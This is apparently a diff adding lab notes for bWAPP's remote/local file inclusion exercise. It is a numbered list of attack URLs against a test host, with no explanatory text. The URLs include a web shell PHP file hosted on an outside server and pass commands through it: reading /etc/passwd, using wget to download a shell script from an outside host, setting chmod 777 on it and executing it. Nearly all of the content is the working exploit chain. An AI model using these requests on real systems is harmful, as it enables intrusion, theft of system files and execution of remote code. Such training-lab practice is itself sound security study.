@@ -1,0 +1,48 @@
+1) Low 레벨
+
+ ① 
+
+http://192.168.20.205/bWAPP/rlfi.php?language=http://bit.ly/43R6gBF&action=go
+
+
+ ② 
+
+http://192.168.20.205/bWAPP/rlfi.php?language=https://blog.kakaocdn.net/dn/q8s5y/btrGg1EzbAG/bDcfKh3MCkvzz8L1Q7XnkK/tfile.php&action=go&cmd=pwd
+
+
+ ③ 
+
+http://192.168.20.205/bWAPP/rlfi.php?language=https://blog.kakaocdn.net/dn/q8s5y/btrGg1EzbAG/bDcfKh3MCkvzz8L1Q7XnkK/tfile.php&action=go&cmd=ls /etc
+
+
+ ④ 
+
+http://192.168.20.205/bWAPP/rlfi.php?language=https://blog.kakaocdn.net/dn/q8s5y/btrGg1EzbAG/bDcfKh3MCkvzz8L1Q7XnkK/tfile.php&action=go&cmd=cat /etc/passwd
+
+
+ ⑤ 
+
+http://192.168.20.205/bWAPP/rlfi.php?language=https://blog.kakaocdn.net/dn/q8s5y/btrGg1EzbAG/bDcfKh3MCkvzz8L1Q7XnkK/tfile.php&action=go&cmd=mkdir test
+
+http://192.168.20.205/bWAPP/rlfi.php?language=https://blog.kakaocdn.net/dn/q8s5y/btrGg1EzbAG/bDcfKh3MCkvzz8L1Q7XnkK/tfile.php&action=go&cmd=touch test/file1
+
+http://192.168.20.205/bWAPP/rlfi.php?language=https://blog.kakaocdn.net/dn/q8s5y/btrGg1EzbAG/bDcfKh3MCkvzz8L1Q7XnkK/tfile.php&action=go&cmd=ls -l test
+
+
+ ⑦ 
+
+http://192.168.20.205/bWAPP/rlfi.php?language=https://blog.kakaocdn.net/dn/q8s5y/btrGg1EzbAG/bDcfKh3MCkvzz8L1Q7XnkK/tfile.php&action=go&cmd=wget http://blog.kakaocdn.net/dn/ctIWDM/btrGg4aFUbk/3qK3Q0C2T99koaKdmbJhWk/tfile.sh
+
+http://192.168.20.205/bWAPP/rlfi.php?language=https://blog.kakaocdn.net/dn/q8s5y/btrGg1EzbAG/bDcfKh3MCkvzz8L1Q7XnkK/tfile.php&action=go&cmd=ls -l tfile.sh
+
+
+ ⑧ 
+
+http://192.168.20.205/bWAPP/rlfi.php?language=https://blog.kakaocdn.net/dn/q8s5y/btrGg1EzbAG/bDcfKh3MCkvzz8L1Q7XnkK/tfile.php&action=go&cmd=chmod 777 tfile.sh
+
+http://192.168.20.205/bWAPP/rlfi.php?language=https://blog.kakaocdn.net/dn/q8s5y/btrGg1EzbAG/bDcfKh3MCkvzz8L1Q7XnkK/tfile.php&action=go&cmd=ls -l tfile.sh
+
+
+ ⑨ 
+
+http://192.168.20.205/bWAPP/rlfi.php?language=https://blog.kakaocdn.net/dn/q8s5y/btrGg1EzbAG/bDcfKh3MCkvzz8L1Q7XnkK/tfile.php&action=go&cmd=./tfile.sh
